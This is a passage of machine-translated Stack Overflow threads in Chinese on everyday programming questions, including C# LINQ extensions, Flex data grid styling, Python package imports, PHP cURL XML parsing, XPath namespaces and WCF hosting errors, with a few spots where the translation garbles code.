    using (IEnumerator<T> iterator = source.GetEnumerator())
    {
        if (!iterator.MoveNext())
        {
            return new T();
        }
        T first = iterator.Current;
        if (iterator.MoveNext())
        {
            throw new InvalidOperationException();
        }
        return first;
    }
} 
```

我会将其添加到要包含在[MoreLinq](http://code.google.com/p/morelinq/)中的运算符列表中...

另一种更通用的方法是提供一个仅在必要时进行评估的委托（我需要一个更好的名字，诚然）：

```
public static T SingleOrSpecifiedDefault<T>(this IEnumerable<T> source,
     Func<T> defaultSelector)
{
    if (source == null)
    {
        throw new ArgumentNullException("source"); 
    }
    if (defaultSelector == null)
    {
        throw new ArgumentNullException("defaultSelector"); 
    }
    using (IEnumerator<T> iterator = source.GetEnumerator())
    {
        if (!iterator.MoveNext())
        {
            return defaultSelector();
        }
        T first = iterator.Current;
        if (iterator.MoveNext())
        {
            throw new InvalidOperationException();
        }
        return first;
    }
} 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-02-18T16:13:39.543

那你为什么不通过扩展方法添加它呢？听起来会很方便。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-02-18T17:46:02.240

```
var theClient =
    Repository<Client>
        .Entities()
        .Where(t => t.ShouldBeHere())
        .SingleOrDefault()
        ?? new Client { Name = "Howdy!" }
    ; 
```

# apache-flex - Flex AdvancedDataGridItemRenderer backgroundColor/textColor 不呈现

> ID：561764
> 
> 赞同：1
> 
> 时间：2009-02-18T16:11:41.967
> 
> 标签：apache-flex, actionscript-3, advanceddatagrid

我有以下扩展 AdvancedDataGridItemRenderer 的类：

```
package
{
    import mx.controls.advancedDataGridClasses.AdvancedDataGridItemRenderer;

    public class TestADGIR extends AdvancedDataGridItemRenderer
    {
            public function TestADGIR()
            {
                    super();
                    backgroundColor = 0; // black
                    textColor = 0xFFFFFF //16777215; // white
            }
    }
} 
```

如您所见，backgroundColor 在构造函数中设置为黑色，textColor 设置为白色。我有一个 AdvancedDataGrid 将 TestADGIR 用于其中一列。但是当网格显示时，该列会以白色背景上的黑色文本呈现 - 与构造函数中设置的内容完全相反。有人可以帮助我理解我做错了什么吗？这是 ADG 的代码：

```
<?xml version="1.0" encoding="utf-8"?>
<mx:Application xmlns:mx="http://www.adobe.com/2006/mxml" layout="absolute" preinitialize="preInitApp()">
    <mx:Script>
        <![CDATA[
            import mx.collections.ArrayCollection;
            import mx.collections.HierarchicalCollectionView;
            import mx.collections.HierarchicalCollectionViewCursor;

            [Bindable]
            private var dpFlat:ArrayCollection = new ArrayCollection([
              {Region:"North", DisplayOrder: 2, Territory:"North1", Territory_Rep:"North1_Rep", ParticipantDisplayOrder: 1, Actual:38865, Estimate:40000}, 
              {Region:"North", DisplayOrder: 2, Territory:"North2", Territory_Rep:"North2_Rep", ParticipantDisplayOrder: 2, Actual:29885, Estimate:30000},  
              {Region:"North", DisplayOrder: 2, Territory:"North3", Territory_Rep:"North3_Rep", ParticipantDisplayOrder: 3, Actual:29134, Estimate:30000},  
              {Region:"North", DisplayOrder: 2, Territory:"North4", Territory_Rep:"North4_Rep", ParticipantDisplayOrder: 4, Actual:52888, Estimate:45000},  
              {Region:"North", DisplayOrder: 2, Territory:"North5", Territory_Rep:"North5_Rep", ParticipantDisplayOrder: 5, Actual:38805, Estimate:40000}, 
              {Region:"North", DisplayOrder: 2, Territory:"North6", Territory_Rep:"North6_Rep", ParticipantDisplayOrder: 6, Actual:55498, Estimate:40000},  
              {Region:"North", DisplayOrder: 2, Territory:"North6", Territory_Rep:"North6_Rep", ParticipantDisplayOrder: 7, Actual:44985, Estimate:45000}, 
              {Region:"North", DisplayOrder: 2, Territory:"North8", Territory_Rep:"North8_Rep", ParticipantDisplayOrder: 8, Actual:44913, Estimate:45000},

              {Region:"South", DisplayOrder: 1, Territory:"South1", Territory_Rep:"South1_Rep", ParticipantDisplayOrder: 1, Actual:38865, Estimate:40000}, 
              {Region:"South", DisplayOrder: 1, Territory:"South2", Territory_Rep:"South2_Rep", ParticipantDisplayOrder: 2, ParticipantDisplayOrder: 2, Actual:29885, Estimate:30000},  
              {Region:"South", DisplayOrder: 1, Territory:"South3", Territory_Rep:"South3_Rep", ParticipantDisplayOrder: 3, Actual:29134, Estimate:30000},  
              {Region:"South", DisplayOrder: 1, Territory:"South4", Territory_Rep:"South4_Rep", ParticipantDisplayOrder: 4, Actual:52888, Estimate:45000},  
              {Region:"South", DisplayOrder: 1, Territory:"South5", Territory_Rep:"South5_Rep", ParticipantDisplayOrder: 5, Actual:38805, Estimate:40000}, 
              {Region:"South", DisplayOrder: 1, Territory:"South6", Territory_Rep:"South6_Rep", ParticipantDisplayOrder: 6, Actual:55498, Estimate:40000},  
              {Region:"South", DisplayOrder: 1, Territory:"South7", Territory_Rep:"South7_Rep", ParticipantDisplayOrder: 7, Actual:44985, Estimate:45000}, 
              {Region:"South", DisplayOrder: 1, Territory:"South8", Territory_Rep:"South8_Rep", ParticipantDisplayOrder: 8, Actual:44913, Estimate:45000}]);

            [Bindable]
            private var itemRendererFactory:ClassFactory = null;

            private function preInitApp():void
            {
                itemRendererFactory = new ClassFactory(TestADGIR);
                //itemRendererFactory.properties = {backgroundColor: 0, textColor: 16777215 };
            }

            private function sortByDisplayOrder(groupA:Object, groupB:Object, fields:Array = null):int
            {
                   if (groupA.Region == groupB.Region) // if we are comparing two records from the same subgroup, then sort the participants
                   {
                       if (groupA.ParticipantDisplayOrder > groupB.ParticipantDisplayOrder)
                       {
                           return 1;
                       }
                       else if (groupA.ParticipantDisplayOrder == groupB.ParticipantDisplayOrder)
                       {
                           return 0;
                       }
                       else
                       {
                           return -1;
                       }
                   }

                   if (groupA.DisplayOrder > groupB.DisplayOrder) // sort the subgroups
                {
                    return 1;
                }
                else if (groupA.DisplayOrder == groupB.DisplayOrder)
                {
                    return 0;
                }
                else
                {
                    return -1;
                }
            }            

        ]]>
    </mx:Script>

    <mx:VBox width="100%" height="100%">
        <mx:Panel title="AdvancedDataGrid Control Example"
            height="100%" width="75%" layout="horizontal"
            paddingTop="10" paddingBottom="10" paddingLeft="10" paddingRight="10">

            <mx:AdvancedDataGrid id="myADG" 
                width="100%" height="100%" 
                initialize="gc.refresh();"
                horizontalScrollPolicy="off"
                 displayItemsExpanded="true"
            >        
                <mx:dataProvider>
                    <mx:GroupingCollection id="gc" source="{dpFlat}">
                        <mx:grouping>
                            <mx:Grouping compareFunction="sortByDisplayOrder">
                                <mx:GroupingField name="Region"/>
                            </mx:Grouping>
                        </mx:grouping>
                    </mx:GroupingCollection>
                </mx:dataProvider>        

                <mx:columns>
                    <mx:AdvancedDataGridColumn id="regionColumn" dataField="Region" itemRenderer="{itemRendererFactory}"/>
                    <mx:AdvancedDataGridColumn id="territoryColumn" dataField="Territory"/>
                    <mx:AdvancedDataGridColumn id="territoryRepColumn" dataField="Territory_Rep"
                        headerText="Territory Rep"/>
                    <mx:AdvancedDataGridColumn id="actualColumn" dataField="Actual"/>
                    <mx:AdvancedDataGridColumn id="estimateColumn" dataField="Estimate"/>
                </mx:columns>

           </mx:AdvancedDataGrid>           

        </mx:Panel>
    </mx:VBox>    
</mx:Application> 
```

谢谢！肖恩

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-02-18T18:00:05.623

我发现可以通过将*background*属性设置为*true然后为**backgroundColor*属性赋值来操作背景颜色。通过调用*setStyle("color", 0xFF0000)*来操作文本颜色。感谢 Eric 为我指出了正确的风格方向。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-02-18T17:08:32.673

这可能是因为 backgroundColor 和 textColor 不是 AdvancedDataGridItemRenderer 类的样式：

[http://livedocs.adobe.com/flex/3/langref/mx/controls/advancedDataGridClasses/AdvancedDataGridItemRenderer.html#styleSummary](http://livedocs.adobe.com/flex/3/langref/mx/controls/advancedDataGridClasses/AdvancedDataGridItemRenderer.html#styleSummary)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-02-19T13:50:10.427

对于自定义行背景颜色，我会覆盖

```
受保护的函数 drawRowBackground(s:Sprite, rowIndex:int,
                                         y：数字，高度：数字，颜色：uint，dataIndex：int）：void
```

总干事

# c# - 可以使用 System.Security.AccessControl 访问 DCOM 安全性吗？

> ID：561765
> 
> 赞同：2
> 
> 时间：2009-02-18T16:11:52.277
> 
> 标签：c#, com, access-control

我知道 DCOM 话题已经讨论过几次了。但是，我对（目前）可用的解决方案并不满意。这就是为什么我在这里开始一个新问题。

现在每个人都知道访问控制列表 (ACL) 存储了有关哪些用户可以对应用程序执行什么操作的信息，这些信息存储在注册表中 HKCL\AppID{GUID}[AccessPermission|LaunchPermission] 下。这些键包含二进制形式的“序列化 ACL”数据 (byte[])。

我根本不相信不可能将这些值与 System.Security.AccessControl 命名空间一起使用。必须有一种“反序列化”它们并在其中添加或删除条目的方法。

另外，我当然是在谈论 .NET 解决方案。可能需要也可能不需要 p/invoking 一些魔术 api 函数或实现一些奇怪的结构，但我确信可以实现一个很好且直观的 .NET 库，使我们能够从托管代码处理 DCOM 安全设置。

有谁知道该怎么做？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-06-15T15:09:53.107

虽然我无法找到完全托管的解决方案，但您会在“Server 2008 Windows SDK”中找到示例程序 DCOMPerm。这可以用作创建完全托管版本的 DCOM 安全设置的模型。

就我而言，我阅读了 SDK 的许可证，其中指出可以分发从样本创建的目标代码。所以我最终执行了 DCOMPerm.exe 以从安装中设置访问权限。

# c# - 在 asp.net for windows ce 中捕获文本框上的 enter 键

> ID：561782
> 
> 赞同：0
> 
> 时间：2009-02-18T16:15:21.613
> 
> 标签：c#, windows-mobile, textbox, asp.net-2.0

我想为 windows ce msie6.0 捕获文本上的 enter 键，但没有按钮，所以我不能为表单标签本身使用默认按钮属性。我还能做些什么来捕获 Enter 键？

谢谢..

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-02-18T16:23:45.323

我在 IE6 中使用过这个函数 javascript，不确定它是否可以在 Windows CE 中使用

```
 <script language="javascript">
    document.onkeydown = myOnkeydown;  
    function myOnkeydown()
    {        
        var key = window.event.keyCode;
        if (key == 13) { //13 is the keycode of the 'Enter' key
           //do stuff
        }
    }
    </script> 
```

编辑：此函数捕获所有字段中的输入。如果您愿意，可以将其插入您选择的文本框。

# python - python MySQL模块类文件名

> ID：561791
> 
> 赞同：2
> 
> 时间：2009-02-18T16:16:36.510
> 
> 标签：python, file, class, directory, module

我很困惑目录名、文件名和类名是如何一起工作的。

这就是我目前所拥有的

```
 app.py
  database/
     client.py
     staff.py
     order.py 
```

在里面`client.py`我有一个名为 的类`client`，它充当数据库模型（MVC）。我的其他文件也一样：`staff.py`有一个名为的类`staff`，`order.py`有`order`。

然后在`app.py`我做：

```
 from database import client as model
  c = model.client() 
```

然后我就糊涂了。在一个理想的世界**中，这就是我想要做的**：

1.  将我的数据库模型类保存在它们自己目录中的单独文件中。

2.  像这样使用它们：

```
 c = model.client()
  o = model.order()
  s = model.staff() 
```

我能看到的唯一方法是将我的所有类放在一个名为的文件中`model.py`并将其保存在根目录中。

我确定我在这里遗漏了一些非常基本的东西。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-02-18T16:37:41.170

Python 有两种基本的内容导入方式。模块和包。

* * *

一个模块只是包含路径上的一个 python 文件：**order.py**

如果 order.py 定义了一个名为**foo**的类，则可以通过以下方式访问该类：

```
import order
o = order.foo() 
```

为了使用原始问题中的语法，您需要确保您的**model.py**文件具有以下属性：[client, staff, order]

但是，这通常意味着将它们放在一个文件中。这是您要避免的。

* * *

包是一个包含**__init__.py**的目录。**init** .py 初始化包（即它在第一次导入时运行），您可以在该目录中拥有模块或子包。

```
model
    __init__.py
    client.py
    staff.py
    order.py 
```

这样，要访问任何子模块，您只需说：

```
import model.client 
```

但是，这只是导入模块。它没有导入模块的任何属性。因此，为了访问模块内的类，您需要指定它：

```
import model.client
o = model.client.clientclass() 
```

这有点乏味，但组织得很好。

* * *

**两者中最好的（性能不是什么大问题）：**

**如果您在__init__.py**中键入以下代码：

```
from .client import clientclass as client
from .staff import staffclass as staff
from .order import orderclass as order 
```

然后你已经自动加载了所有的类，它们可以通过以下方式访问：

```
import model
c = model.client()
s = model.staff()
o = model.order() 
```

* * *

最后，坚持使用非魔法方式可能更简单：

```
import model.client
o = model.client.clientclass() 
```

——嘎呼阿

# c# - 如何使用 C# 对齐 ListView 中单个子项的文本？

> ID：561798
> 
> 赞同：6
> 
> 时间：2009-02-18T16:19:11.840
> 
> 标签：c#, listview, text-alignment

我无法在任何地方找到关于这个看似简单的主题的答案：**是否可以在 WinForms ListView 控件中对齐单个子项的文本？**

如果是这样，怎么做？

我想让同一列中的文本以不同的方式对齐。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-05-11T03:46:26.610

例子 ：

```
listView1.Columns[1].TextAlign = HorizontalAlignment.Right; 
```

将列的“1”对齐设置为右

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2016-07-27T19:56:44.397

**注意：由于底层原生 ListView 控件（位于 comctl32.dll 中）的限制，第一列无法对齐。它总是左对齐。第二个限制是当您自定义绘制（自定义绘制子项）时：当您启用列重新排序时，第一列的文本未正确重新排序。我通过不允许对第一列重新排序解决了这个限制（不会称其为错误，因为列表视图支持许多列表样式并且列表视图的内部数据结构是树状的），这在大多数情况下是没有问题的，因为您将对第一列使用某种键，例如数字或类似的东西。**

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2009-02-18T16:29:53.810

“ColumnHeader”类有一个“TextAlign”属性，它将更改列中所有子项的对齐方式。如果您需要更花哨的东西，您可以随时使用“DrawSubItem”事件并使其所有者绘制。

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2009-02-19T09:03:13.877

为了将来参考，这是我解决它的方法：

```
// Make owner-drawn to be able to give different alignments to single subitems
lvResult.OwnerDraw = true;
...

// Handle DrawSubItem event
private void lvResult_DrawSubItem(object sender, DrawListViewSubItemEventArgs e)
{
    // This is the default text alignment
    TextFormatFlags flags = TextFormatFlags.Left;

    // Align text on the right for the subitems after row 11 in the 
    // first column
    if (e.ColumnIndex == 0 && e.Item.Index > 11)
    {
        flags = TextFormatFlags.Right;
    }

    e.DrawText(flags);
}

// Handle DrawColumnHeader event
private void lvResult_DrawColumnHeader(object sender, DrawListViewColumnHeaderEventArgs e)
{
    // Draw the column header normally
    e.DrawDefault = true;
    e.DrawBackground();
    e.DrawText();
} 
```

必须处理 DrawColumnHeader，否则不会绘制文本或列分隔符。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2020-03-29T21:56:05.683

将 ListView 控件放在窗体上并将其命名为“listV1”并添加和编辑 4 列。同时定义一个索引。然后，格式化列“0”，不带标题，宽度=0。这样第 0 列将不可见。然后，您可以根据需要格式化其他列（左、中、右），这些列都是可见的。

```
ListView listV1 = new ListView();
uint Index = 0;   
string[] Split_Message = Some_Message.Split(','); // split it to comma...
ListViewItem L = new ListViewItem(""); //... to column "0" assign empty string...
L.SubItems.Add(Index.ToString() + "."); //... than fill the first fild in the row. It is number converted to string...
L.SubItems.Add(Split_Message[0]); //... then first string from buffer...
L.SubItems.Add(Split_Message[1]); //... again, second string from buffer etc. ...
listV1.Items.Add(L); //... and at the end write all of this into the first row.
Indexx++; // Next number. 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2020-06-02T17:08:25.300

基于@Fueled 的答案，这是我使用列标题对齐所做的：

```
 protected override void OnDrawSubItem( DrawListViewSubItemEventArgs e )
        {
        // Match the subitem alignment to the column header alignment
        TextFormatFlags flags = TextFormatFlags.Left;
        switch ( this.Columns[ e.ColumnIndex ].TextAlign )
            {
            case HorizontalAlignment.Right:
                flags = TextFormatFlags.Right;
                break;
            case HorizontalAlignment.Center:
                flags = TextFormatFlags.HorizontalCenter;
                break;
            }
        e.DrawText( flags );
        } 
```

# php - PHP cURL，提取 XML 响应

> ID：561816
> 
> 赞同：38
> 
> 时间：2009-02-18T16:25:13.090
> 
> 标签：php, curl

我在服务器上调用 PHP cURL 方法，响应是 XML 类型。cURL 将输出（删除标签后）保存在标量类型变量中。有没有办法将它存储在对象/哈希/数组中以便于解析？

* * *

## 回答 #1

> 赞同：117
> 
> 时间：2009-02-18T23:08:29.827

```
<?php
function download_page($path){
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL,$path);
    curl_setopt($ch, CURLOPT_FAILONERROR,1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION,1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 15);
    $retValue = curl_exec($ch);          
    curl_close($ch);
    return $retValue;
}

$sXML = download_page('http://alanstorm.com/atom');
$oXML = new SimpleXMLElement($sXML);

foreach($oXML->entry as $oEntry){
    echo $oEntry->title . "\n";
} 
```

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2011-10-25T14:17:39.397

只需`header('Content-type: application/xml');`在 XML 响应的回显之前添加，您就会看到一个 XML 页面。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2013-05-04T13:38:23.580

例子：

```
<songs>
<song dateplayed="2011-07-24 19:40:26">
    <title>I left my heart on Europa</title>
    <artist>Ship of Nomads</artist>
</song>
<song dateplayed="2011-07-24 19:27:42">
    <title>Oh Ganymede</title>
    <artist>Beefachanga</artist>
</song>
<song dateplayed="2011-07-24 19:23:50">
    <title>Kallichore</title>
    <artist>Jewitt K. Sheppard</artist>
</song> 
```

然后：

```
<?php
$mysongs = simplexml_load_file('songs.xml');
echo $mysongs->song[0]->artist;
?> 
```

浏览器上的输出：**游牧民族之船**

学分：[http ://blog.teamtreehouse.com/how-to-parse-xml-with-php5](http://blog.teamtreehouse.com/how-to-parse-xml-with-php5)

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-02-18T16:28:19.023

不，CURL 没有解析 XML 的任何内容，它对返回的内容一无所知。它充当获取内容的代理。由你决定如何处理它。

尽可能使用 JSON（和 json_decode） - 如果不可能，使用任何 XML 库进行解析更容易，例如 DOMXML： [http ://php.net/domxml](http://php.net/domxml)

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2016-09-21T16:10:49.717

```
$sXML = download_page('http://alanstorm.com/atom');
// Comment This    
// $oXML = new SimpleXMLElement($sXML);
// foreach($oXML->entry as $oEntry){
//  echo $oEntry->title . "\n";
// }
// Use json encode
$xml = simplexml_load_string($sXML);
$json = json_encode($xml);
$arr = json_decode($json,true);
print_r($arr); 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2015-07-22T06:17:40.463

简单加载xml文件..

```
$xml = @simplexml_load_string($retValuet);

$status = (string)$xml->Status; 
$operator_trans_id = (string)$xml->OPID;
$trns_id = (string)$xml->TID; 
```

?>

# oop - “告诉，不要问”是否适用于用户输入验证？

> ID：561820
> 
> 赞同：5
> 
> 时间：2009-02-18T16:27:30.727
> 
> 标签：oop, tell-dont-ask

不知何故，这些年来我一定忽略了“告诉，不要问”OOP 原则，因为我几天前才第一次了解它。

但是上下文是关于验证代码的讨论，该代码已从 ASP.NET Web 表单页面移到数据/业务对象中，并且没有“Validate()”方法，只是一个本身进行验证的保存方法和（据说）引发了异常。我问为什么要这样设计，我被引导到 OOP 的“告诉，不要问”原则，这是我从未听说过的，所以我们一起研究了 Google，我立即受到了教育。;)

仍然，有些东西闻起来不对劲，是否应该在数据从用户手中转移到处理和/或收集数据的业务层之前对其进行清理，而不是反过来？我很困惑这如何促成好的设计。

似乎“告诉，不要问”的规则与您不应该向目标对象询问目标对象状态的想法有关，并且该原则从未真正适用于传递*给*目标对象。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-02-18T16:33:54.330

我认为这听起来像是一堆“最佳实践”和“设计方法”出了问题，但现在对我来说有点道理。这样看：

想象一下将验证放在业务对象中，但在表示层中“如果验证失败我该怎么办”。这将允许多个不同的表示层重用相同的验证逻辑，但以不同的方式处理错误。

> ```
> public Foo
> {
>   Validate(Baz bar)
>   {
>       if(!is_number(bar)) throw numberexception();
>   }
> 
>   AssignBar(Baz bar)
>   {
>       Validate(bar);
>   }
> }
> 
> //...
> 
> try
> {
>   foo.AssignBar(bar);
> }
> catch(numberexception e)
> {
>   alert('Not a number!');
> } 
> ```

注意，您可以就抛出异常进行任何争论，这只是一个例子。返回状态，布尔值，无论你想要什么。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-02-18T16:43:17.087

我同意 AviewAview，但只有在用户告诉（而不是他要求时）时才会抛出异常：

```
public Foo
{
  bool Validate(Baz bar)
  {
        if(!is_number(bar)) return false;
        return true;
  }

  AssignBar(Baz bar)
  {
        if (!Validate(bar)) throw numberexception();
  }
} 
```

告诉：

```
try
{
  foo.AssignBar(bar);
}
catch(numberexception e)
{
  alert('Not a number!');
} 
```

问：

```
if (foo.Validate(bar)
{
  foo.AssignBar(bar);
}
else
{
  alert('Not a number!');
} 
```

因此，AssignBar 需要一个 VALID 条，如果不是则抛出异常，但我们还提供了一个 Validate 方法，它不会抛出异常。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-02-18T16:43:40.080

我想知道这是否更像是一个“关注点分离”而不是“告诉不要问”的问题。验证数据是谁的责任？可以说，它是负责坚持它的东西。

当然，有时在多个层中验证数据很有用。如果您的应用程序是这种情况，那么在“用户”层中公开验证逻辑是没有问题的。但我仍然希望它在业务层中。

# xml - 具有命名空间的 XML 文档上的 XPath

> ID：561822
> 
> 赞同：10
> 
> 时间：2009-02-18T16:28:04.157
> 
> 标签：xml, xpath, namespaces

我有这个带有命名空间的 XML 文档，我想使用 XPath 提取一些节点。

这是文件：

```
<ArrayOfAnyType xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns="http://tempuri.org/">
  <anyType xsi:type="Document">
    <Id>5</Id>
    <Title>T1</Title>
  </anyType>

  <anyType xsi:type="Document">
    <Id>15</Id>
    <Title>T15</Title>
  </anyType>
</ArrayOfAnyType> 
```

如果我想用 xsi:type="Document" 提取所有“anyType”元素，XPath 表达式会是什么？

我试过这个：

```
//anyType[@xsi:type="Document"] 
```

它不起作用：

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2009-02-18T16:38:13.417

如果您使用的是 C#，那么您需要在 XPath 中为“anyType”元素指定命名空间：

```
var xml = new XmlDocument();
xml.LoadXml( "your xml" );
var names = new XmlNamespaceManager( xml.NameTable );
names.AddNamespace( "xsi", "http://www.w3.org/2001/XMLSchema-instance" );
names.AddNamespace( "a", "http://tempuri.org/" );
var nodes = xml.SelectNodes( "//a:anyType[@xsi:type='Document']", names ); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-02-18T17:02:10.363

我觉得

```
//anyType[namespace-uri() = "http://www.w3.org/2001/XMLSchema-instance"][local-name() = "type"] 
```

会做你想做的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2018-02-14T10:12:43.293

这样你就不需要指定命名空间：

```
XmlDocument xmlDoc = new XmlDocument();
xmlDoc.LoadXml("your xml");
XmlNode node = xmlDoc.SelectSingleNode("/*[local-name() = 'anyType']");
XmlNode nodeToImport = xmlDoc2.ImportNode(node, true);
xmlDoc2.AppendChild(nodeToImport); 
```

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2011-01-26T13:32:02.253

有几乎相同的问题，我忘了为 xsi 添加正确的命名空间：type （[http://www.w3.org/2001/XMLSchema-instance](http://www.w3.org/2001/XMLSchema-instance)）正在使用[http://www.w3.org/2001/XMLSchema](http://www.w3.org/2001/XMLSchema) 和我从来没有得到任何结果 - 现在它的工作方式如下：

```
<xsl:value-of select="/item1/item2/item3/@xsi:type"></xsl:value-of> 
```

# .net - WCF 服务启动错误“此集合已包含带有方案 http 的地址”

> ID：561823
> 
> 赞同：187
> 
> 时间：2009-02-18T16:28:14.767
> 
> 标签：.net, wcf

我构建了一个 Web 应用程序，其中包含一个 WCF 服务协定和一个调用该 WCF 服务的 Silverlight 控件。在我的开发和测试服务器上，它运行良好。

当我部署到我们的实时服务器并运行应用程序时，我得到一个类型的异常`System.ServiceModel.ServiceActivationException`，指出由于编译过程中的异常而无法激活服务。例外是：

> 这个集合已经包含一个带有 http 方案的地址。此集合中的每个方案最多可以有一个地址。

我读到如果网站有多个主机标头，则可能会引发此异常，这在我们的实时服务器上是正确的。显然，托管在 IIS 中的 WCF 服务只能有一个基地址。我该如何解决这个问题？

* * *

## 回答 #1

> 赞同：172
> 
> 时间：2010-07-08T18:52:17.780

在 .Net 4 中，您可以使用以下`multipleSiteBindingsEnabled`选项：

```
<system.serviceModel>
    <serviceHostingEnvironment multipleSiteBindingsEnabled="true">
    </serviceHostingEnvironment>
</system.serviceModel> 
```

然后，您不必指定每个地址。

[http://msdn.microsoft.com/en-us/library/system.servicemodel.servicehostingenvironment.multiplesitebindingsenabled.aspx](http://msdn.microsoft.com/en-us/library/system.servicemodel.servicehostingenvironment.multiplesitebindingsenabled.aspx)

* * *

## 回答 #2

> 赞同：148
> 
> 时间：2009-02-18T17:06:50.103

概括，

**代码解决方案：** [这里](http://www.robzelt.com/blog/index.php/2007/02/wcf-this-collection-already-contains-an-address-with-scheme-http-update/)

**配置解决方案：** [这里](https://web.archive.org/web/20100123141535/http://blogs.msdn.com/rampo/archive/2008/02/11/how-can-wcf-support-multiple-iis-binding-specified-per-site.aspx)

[在Mike Chaliy](https://stackoverflow.com/users/38975/mike-chaliy)的帮助下，我找到了一些关于如何通过代码执行此操作的解决方案。因为这个问题会影响我们部署到实时环境的几乎所有项目，所以我坚持使用纯粹的配置解决方案。我最终找到了一个详细说明如何在 .net 3.0 和 .net 3.5 中执行此操作的内容。

取自该站点，以下是如何更改应用程序 Web 配置的示例：

```
<system.serviceModel>
    <serviceHostingEnvironment>
        <baseAddressPrefixFilters>
            <add prefix="net.tcp://payroll.myorg.com:8000"/>
            <add prefix="http://shipping.myorg.com:9000"/>
        </baseAddressPrefixFilters>
    </serviceHostingEnvironment>
</system.serviceModel> 
```

> 在上面的例子中，net.tcp://payroll.myorg.com:8000 和 [http://shipping.myorg.com:9000](http://shipping.myorg.com:9000)是它们各自方案的唯一基地址，它们将被允许通过。baseAddressPrefixFilter 不支持任何通配符。
> 
> IIS 提供的 baseAddresses 可能具有绑定到 baseAddressPrefixFilter 列表中不存在的其他方案的地址。这些地址不会被过滤掉。

**Dns 解决方案（未经测试）：** 我认为，如果您创建一个特定于您的 Web 应用程序的新 dns 条目，添加一个新网站，并为其提供与 dns 条目匹配的单个主机标头，您将完全缓解此问题，并且不会必须编写自定义代码或为您的 web.config 文件添加前缀。

* * *

## 回答 #3

> 赞同：63
> 
> 时间：2009-02-18T16:35:29.803

你看到了吗 - [http://kb.discountasp.net/KB/a799/error-accessing-wcf-service-this-collection-already.aspx](http://kb.discountasp.net/KB/a799/error-accessing-wcf-service-this-collection-already.aspx)

> 您可以通过更改 web.config 文件来解决此错误。
> 
> 使用 ASP.NET 4.0，将以下行添加到您的 web.config：

```
<system.serviceModel> 
     <serviceHostingEnvironment multipleSiteBindingsEnabled="true" /> 
</system.serviceModel> 
```

> 使用 ASP.NET 2.0/3.0/3.5，将以下行添加到您的 web.config：

```
<system.serviceModel> 
     <serviceHostingEnvironment> 
          <baseAddressPrefixFilters> 
               <add prefix="http://www.YourHostedDomainName.com"/> 
          </baseAddressPrefixFilters> 
     </serviceHostingEnvironment> 
</system.serviceModel> 
```

* * *

## 回答 #4

> 赞同：19
> 
> 时间：2013-05-27T07:34:01.770

在我的情况下，这个问题的根本原因是在父网站上定义了多个 http 绑定，即 InetMgr->Sites->Mysite->properties->EditBindings。我删除了一个不需要的 http 绑定，问题得到解决。

* * *

## 回答 #5

> 赞同：11
> 
> 时间：2015-11-25T17:36:24.953

就我而言，这很简单：我在 Visual Studio 中使用了“添加 WCF 服务”向导，它会自动在 app.config 中创建相应的部分。然后我继续阅读[How to: Host a WCF Service in a Managed Application](https://msdn.microsoft.com/en-us/library/ms730935(v=vs.110).aspx)。问题是：我不需要指定 url 来运行 Web 服务。

代替：

```
using (ServiceHost host = new ServiceHost(typeof(HelloWorldService), baseAddress)) 
```

和：

```
using (ServiceHost host = new ServiceHost(typeof(HelloWorldService)) 
```

并且错误消失了。

一般的想法：如果你提供基地址作为参数*并*在配置中指定它，你会得到这个错误。很可能，这不是获得错误的唯一方法，你。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2017-01-10T20:06:12.893

我遇到了这个问题，原因很愚蠢。我正在尝试微软关于从命令行可执行文件中运行 ServiceHost 的演示。我按照说明进行操作，包括添加适当服务（和接口）的位置。但我得到了上述错误。

原来，当我添加服务类时，VS 自动将配置添加到 app.config。该演示也试图添加该信息。由于它已经在配置中，因此我删除了演示部分，并且它起作用了。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2020-05-15T11:20:44.167

我在旧的 2010 Exchange Server 上遇到了同样的错误。服务（Exchange 邮箱复制服务）发出上述错误，无法继续迁移过程。通过互联网搜索，我通过此[链接](https://docs.microfocus.com/itom/Data_Protector:2019.12/ExchGREFailsOpen)找到了以下内容：

**首次安装或对 IIS 服务器进行任何更改时，Exchange GRE 无法打开。它失败并出现管理单元错误，当您尝试打开管理单元页面时，将显示以下内容：**

```
This collection already contains an address with scheme http.  There can be at most one address per scheme in this collection. If your service is being hosted in IIS you can fix the problem by setting 'system.serviceModel/serviceHostingEnvironment/multipleSiteBindingsEnabled' to true or specifying 'system.serviceModel/serviceHostingEnvironment/baseAddressPrefixFilters'." 
```

**原因**：出现此错误是因为 http 端口号 443 已被另一个应用程序使用，并且 IIS 服务器未配置为处理多个绑定到同一端口。

**解决方案**：配置 IIS 服务器以处理多个端口绑定。请联系供应商 (Microsoft) 进行配置。

